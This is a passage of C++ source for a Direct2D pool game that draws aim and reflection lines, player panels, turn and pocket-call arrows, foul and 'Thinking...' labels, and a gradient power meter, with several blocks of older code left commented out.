            // -- Cue Ball Path after collision (Optional, requires physics) --
            // Very simplified: Assume cue deflects, angle depends on cut angle.
            // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
            // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
            // D2D1_POINT_2F cueProjectionEnd = ...
            // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // --- Accuracy Comment ---
            // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
            // or shots with spin, is limited by the simplified physics model. Real pool physics involves
            // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
            // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

        }
        else if (aimingAtRail && hitRailIndex != -1) {
            // Aiming at a rail: Draw reflection line
            float reflectAngle = cueAngle;
            // Reflect angle based on which rail was hit
            if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
                reflectAngle = PI - cueAngle; // Reflect horizontal component
            }
            else { // Top or Bottom rail
                reflectAngle = -cueAngle; // Reflect vertical component
            }
            // Normalize angle if needed (atan2 usually handles this)
            while (reflectAngle > PI) reflectAngle -= 2 * PI;
            while (reflectAngle <= -PI) reflectAngle += 2 * PI;


            float reflectionLength = 60.0f; // Length of the reflection line
            D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
                finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
                finalLineEnd.y + sinf(reflectAngle) * reflectionLength
            );

            // Draw the reflection line (e.g., using a different color/style)
            pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
        }

        // Release resources
        SafeRelease(&pBrush);
        SafeRelease(&pGhostBrush);
        SafeRelease(&pCueBrush);
        SafeRelease(&pReflectBrush); // Release new brush
        SafeRelease(&pCyanBrush);
        SafeRelease(&pPurpleBrush);
        SafeRelease(&pDashedStyle);
    }


    void DrawUI(ID2D1RenderTarget* pRT) {
        if (!pTextFormat || !pLargeTextFormat) return;

        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
        if (!pBrush) return;

        //new code
        // --- Always draw AI's 8?Ball call arrow when it's Player?2's turn and AI has called ---
        //if (isPlayer2AI && currentPlayer == 2 && calledPocketP2 >= 0) {
            // FIX: This condition correctly shows the AI's called pocket arrow.
        if (isPlayer2AI && IsPlayerOnEightBall(2) && calledPocketP2 >= 0) {
            // pocket index that AI called
            int idx = calledPocketP2;
            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    { P.x - 15.0f, P.y - 40.0f },
                    { P.x + 15.0f, P.y - 40.0f },
                    { P.x       , P.y - 10.0f }
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrow);
            }
            // draw “Choose a pocket...” prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""AI has called this pocket"",
                (UINT32)wcslen(L""AI has called this pocket""),
                pTextFormat,
                &txt,
                pBrush
            );
            // note: no return here — we still draw fouls/turn text underneath
        }
        //end new code

        // --- Player Info Area (Top Left/Right) --- (Unchanged)
        float uiTop = TABLE_TOP - 80;
        float uiHeight = 60;
        float p1Left = TABLE_LEFT;
        float p1Width = 150;
        float p2Left = TABLE_RIGHT - p1Width;
        D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
        D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

        // Player 1 Info Text (Unchanged)
        std::wostringstream oss1;
        oss1 << player1Info.name.c_str() << L""\n"";
        if (player1Info.assignedType != BallType::NONE) {
            oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss1 << L""(Undecided)"";
        }
        pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);
        // Draw Player 1 Side Ball
        if (player1Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player1Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p1Rect.right + 10.0f, p1Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player1Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }


        // Player 2 Info Text (Unchanged)
        std::wostringstream oss2;
        oss2 << player2Info.name.c_str() << L""\n"";
        if (player2Info.assignedType != BallType::NONE) {
            oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss2 << L""(Undecided)"";
        }
        pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);
        // Draw Player 2 Side Ball
        if (player2Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player2Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p2Rect.right + 10.0f, p2Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player2Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }

        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            D2D1_RECT_F playerBox = (currentPlayer == 1) ? p1Rect : p2Rect;
            arrowBackX = playerBox.left - 25.0f;
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f;

            float notchDepth = 12.0f;  // Increased from 6.0f to make the rectangle longer
            float notchWidth = 10.0f;

            float cx = arrowBackX;
            float cy = arrowCenterY;

            // Define triangle + rectangle tail shape
            D2D1_POINT_2F tip = D2D1::Point2F(arrowTipX, cy);                           // tip
            D2D1_POINT_2F baseTop = D2D1::Point2F(cx, cy - arrowSizeBase / 2.0f);          // triangle top
            D2D1_POINT_2F baseBot = D2D1::Point2F(cx, cy + arrowSizeBase / 2.0f);          // triangle bottom

            // Rectangle coordinates for the tail portion:
            D2D1_POINT_2F r1 = D2D1::Point2F(cx - notchDepth, cy - notchWidth / 2.0f);   // rect top-left
            D2D1_POINT_2F r2 = D2D1::Point2F(cx, cy - notchWidth / 2.0f);                 // rect top-right
            D2D1_POINT_2F r3 = D2D1::Point2F(cx, cy + notchWidth / 2.0f);                 // rect bottom-right
            D2D1_POINT_2F r4 = D2D1::Point2F(cx - notchDepth, cy + notchWidth / 2.0f);    // rect bottom-left

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(baseTop);
                    pSink->AddLine(r2); // transition from triangle into rectangle
                    pSink->AddLine(r1);
                    pSink->AddLine(r4);
                    pSink->AddLine(r3);
                    pSink->AddLine(baseBot);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }


            SafeRelease(&pArrowBrush);
        }

        //original
    /*
        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            if (currentPlayer == 1) {
    arrowBackX = p1Rect.left - 25.0f; // Position left of the box
                arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
                // Define points for right-pointing arrow
                //D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
                //D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
                //D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back
                // Enhanced arrow with base rectangle intersection
        float notchDepth = 6.0f; // Depth of square base ""stem""
        float notchWidth = 4.0f; // Thickness of square part

        D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
        D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
        D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY - notchWidth / 2.0f); // Square Left-Top
        D2D1_POINT_2F pt4 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY + notchWidth / 2.0f); // Square Left-Bottom
        D2D1_POINT_2F pt5 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back


        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(pt2);
                pSink->AddLine(pt3);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
            }


            //==================else player 2
            else { // Player 2
             // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
             // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    arrowBackX = p2Rect.left - 25.0f; // Position left of the box
    arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
    // Define points for right-pointing arrow
    D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
    D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
    D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

    ID2D1PathGeometry* pPath = nullptr;
    if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
        ID2D1GeometrySink* pSink = nullptr;
        if (SUCCEEDED(pPath->Open(&pSink))) {
            pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
            pSink->AddLine(pt2);
            pSink->AddLine(pt3);
            pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
            pSink->Close();
            SafeRelease(&pSink);
            pRT->FillGeometry(pPath, pArrowBrush);
        }
        SafeRelease(&pPath);
    }
            }
            */


            // --- Persistent Blue 8?Ball Call Arrow & Prompt ---
        /*if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
        {
            // determine index (default top?right)
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
        }*/

        // --- Persistent Blue 8?Ball Pocket Arrow & Prompt (once called) ---
    /* if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
    {
        // 1) Determine pocket index
        int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
        // If the other player had called but it's now your turn, still show that call
        if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
        if (idx < 0) idx = 2; // default to top?right if somehow still unset

        // 2) Draw large blue arrow
        ID2D1SolidColorBrush* pArrow = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
        if (pArrow) {
            auto P = pocketPositions[idx];
            D2D1_POINT_2F tri[3] = {
                { P.x - 15.0f, P.y - 40.0f },
                { P.x + 15.0f, P.y - 40.0f },
                { P.x       , P.y - 10.0f }
            };
            ID2D1PathGeometry* geom = nullptr;
            pFactory->CreatePathGeometry(&geom);
            ID2D1GeometrySink* sink = nullptr;
            geom->Open(&sink);
            sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
            sink->AddLines(&tri[1], 2);
            sink->EndFigure(D2D1_FIGURE_END_CLOSED);
            sink->Close();
            pRT->FillGeometry(geom, pArrow);
            SafeRelease(&sink);
            SafeRelease(&geom);
            SafeRelease(&pArrow);
        }

        // 3) Draw persistent prompt text
        D2D1_RECT_F txt = D2D1::RectF(
            TABLE_LEFT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
            TABLE_RIGHT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
        );
        pRT->DrawText(
            L""Choose a pocket..."",
            (UINT32)wcslen(L""Choose a pocket...""),
            pTextFormat,
            &txt,
            pBrush
        );
        // Note: no 'return'; allow foul/turn text to draw beneath if needed
    } */

    // new code ends here

        // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
        if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
            ID2D1SolidColorBrush* pFoulBrush = nullptr;
            pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
            if (pFoulBrush && pLargeTextFormat) {
                // Calculate Rect for bottom-middle area
                float foulWidth = 200.0f; // Adjust width as needed
                float foulHeight = 60.0f;
                float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
                // Position below the pocketed balls bar
                float foulTop = pocketedBallsBarRect.bottom + 10.0f;
                D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

                // --- Set text alignment to center for foul text ---
                pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

                // --- Restore default alignment for large text if needed elsewhere ---
                // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                SafeRelease(&pFoulBrush);
            }
        }

        // --- Blue Arrow & Prompt for 8?Ball Call (while choosing or after called) ---
        if ((currentGameState == CHOOSING_POCKET_P1
            || currentGameState == CHOOSING_POCKET_P2)
            || (calledPocketP1 >= 0 || calledPocketP2 >= 0))
        {
            // determine index:
            //  - if a call exists, use it
            //  - if still choosing, use hover if any
            // determine index: use only the clicked call; default to top?right if unset
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt below pockets
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
            // do NOT return here; allow foul/turn text to display under the arrow
        }

        // Removed Obsolete
        /*
        // --- 8-Ball Pocket Selection Arrow & Prompt ---
        if (currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2) {
            // Determine which pocket to highlight (default to Top-Right if unset)
            int idx = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
            if (idx < 0) idx = 2;

            // Draw the downward arrow
            ID2D1SolidColorBrush* pArrowBrush = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
            if (pArrowBrush) {
                D2D1_POINT_2F P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 10.0f, P.y - 30.0f},
                    {P.x + 10.0f, P.y - 30.0f},
                    {P.x        , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrowBrush);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrowBrush);
            }

            // Draw “Choose a pocket...” text under the table
            D2D1_RECT_F prompt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &prompt,
                pBrush
            );

            return; // Skip normal turn/foul text
        }
        */


        // Show AI Thinking State (Unchanged from previous step)
        if (currentGameState == AI_THINKING && pTextFormat) {
            ID2D1SolidColorBrush* pThinkingBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
            if (pThinkingBrush) {
                D2D1_RECT_F thinkingRect = p2Rect;
                thinkingRect.top += 20; // Offset within P2 box
                // Ensure default text alignment for this
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
                pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
                SafeRelease(&pThinkingBrush);
            }
        }

        SafeRelease(&pBrush);

        // --- Draw CHEAT MODE label if active ---
        if (cheatModeEnabled) {
            ID2D1SolidColorBrush* pCheatBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red), &pCheatBrush);
            if (pCheatBrush && pTextFormat) {
                D2D1_RECT_F cheatTextRect = D2D1::RectF(
                    TABLE_LEFT + 10.0f,
                    TABLE_TOP + 10.0f,
                    TABLE_LEFT + 200.0f,
                    TABLE_TOP + 40.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""CHEAT MODE ON"", wcslen(L""CHEAT MODE ON""), pTextFormat, &cheatTextRect, pCheatBrush);
            }
            SafeRelease(&pCheatBrush);
        }
    }

    void DrawPowerMeter(ID2D1RenderTarget* pRT) {
        // Draw Border
        ID2D1SolidColorBrush* pBorderBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
        if (!pBorderBrush) return;
        pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 2.0f);
        SafeRelease(&pBorderBrush);

        // Create Gradient Fill
        ID2D1GradientStopCollection* pGradientStops = nullptr;
        ID2D1LinearGradientBrush* pGradientBrush = nullptr;
        D2D1_GRADIENT_STOP gradientStops[4];
        gradientStops[0].position = 0.0f;
        gradientStops[0].color = D2D1::ColorF(D2D1::ColorF::Green);
        gradientStops[1].position = 0.45f;
        gradientStops[1].color = D2D1::ColorF(D2D1::ColorF::Yellow);
        gradientStops[2].position = 0.7f;
        gradientStops[2].color = D2D1::ColorF(D2D1::ColorF::Orange);
        gradientStops[3].position = 1.0f;
        gradientStops[3].color = D2D1::ColorF(D2D1::ColorF::Red);

        pRT->CreateGradientStopCollection(gradientStops, 4, &pGradientStops);
        if (pGradientStops) {
            D2D1_LINEAR_GRADIENT_BRUSH_PROPERTIES props = {};
            props.startPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.bottom);
            props.endPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.top);
            pRT->CreateLinearGradientBrush(props, pGradientStops, &pGradientBrush);
            SafeRelease(&pGradientStops);
        }

        // Calculate Fill Height
        float fillRatio = 0;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Determine if power meter should reflect shot power (human aiming or AI preparing)
        bool humanIsAimingPower = isAiming && (currentGameState == AIMING || currentGameState == BREAKING);
        // NEW Condition: AI is displaying its aim, so show its chosen power
        bool aiIsVisualizingPower = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (humanIsAimingPower || aiIsVisualizingPower) { // Use the new condition
            fillRatio = shotPower / MAX_SHOT_POWER;
        }
        float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
        D2D1_RECT_F fillRect = D2D1::RectF(
            powerMeterRect.left,
            powerMeterRect.bottom - fillHeight,
            powerMeterRect.right,
            powerMeterRect.bottom
        );

        if (pGradientBrush) {
            pRT->FillRectangle(&fillRect, pGradientBrush);
            SafeRelease(&pGradientBrush);
        }

        // Draw scale notches
        ID2D1SolidColorBrush* pNotchBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pNotchBrush);
        if (pNotchBrush) {
            for (int i = 0; i <= 8; ++i) {
                float y = powerMeterRect.top + (powerMeterRect.bottom - powerMeterRect.top) * (i / 8.0f);
                pRT->DrawLine(
                    D2D1::Point2F(powerMeterRect.right + 2.0f, y),
                    D2D1::Point2F(powerMeterRect.right + 8.0f, y),
                    pNotchBrush,
                    1.5f
                );
            }
            SafeRelease(&pNotchBrush);
        }

        // Draw ""Power"" Label Below Meter
        if (pTextFormat) {
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pTextBrush);
            if (pTextBrush) {
                D2D1_RECT_F textRect = D2D1::RectF(
                    powerMeterRect.left - 20.0f,
                    powerMeterRect.bottom + 8.0f,
                    powerMeterRect.right + 20.0f,
                    powerMeterRect.bottom + 38.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""Power"", 5, pTextFormat, &textRect, pTextBrush);
                SafeRelease(&pTextBrush);
            }
        }

        // Draw Glow Effect if fully charged or fading out
        static float glowPulse = 0.0f;
        static bool glowIncreasing = true;
        static float glowFadeOut = 0.0f; // NEW: tracks fading out

        if (shotPower >= MAX_SHOT_POWER * 0.99f) {
            // While fully charged, keep pulsing normally
            if (glowIncreasing) {
                glowPulse += 0.02f;
                if (glowPulse >= 1.0f) glowIncreasing = false;
            }
            else {
                glowPulse -= 0.02f;
                if (glowPulse <= 0.0f) glowIncreasing = true;
            }
            glowFadeOut = 1.0f; // Reset fade out to full
        }
        else if (glowFadeOut > 0.0f) {
            // If shot fired, gradually fade out
            glowFadeOut -= 0.02f;
            if (glowFadeOut < 0.0f) glowFadeOut = 0.0f;
        }

        if (glowFadeOut > 0.0f) {
            ID2D1SolidColorBrush* pGlowBrush = nullptr;
            float effectiveOpacity = (0.3f + 0.7f * glowPulse) * glowFadeOut;
            pRT->CreateSolidColorBrush(
                D2D1::ColorF(D2D1::ColorF::Red, effectiveOpacity),
                &pGlowBrush
            );
            if (pGlowBrush) {
                float glowCenterX = (powerMeterRect.left + powerMeterRect.right) / 2.0f;
                float glowCenterY = powerMeterRect.top;
                D2D1_ELLIPSE glowEllipse = D2D1::Ellipse(
                    D2D1::Point2F(glowCenterX, glowCenterY - 10.0f),
                    12.0f + 3.0f * glowPulse,
                    6.0f + 2.0f * glowPulse
                );
                pRT->FillEllipse(&glowEllipse, pGlowBrush);
                SafeRelease(&pGlowBrush);
            }
        }
    }

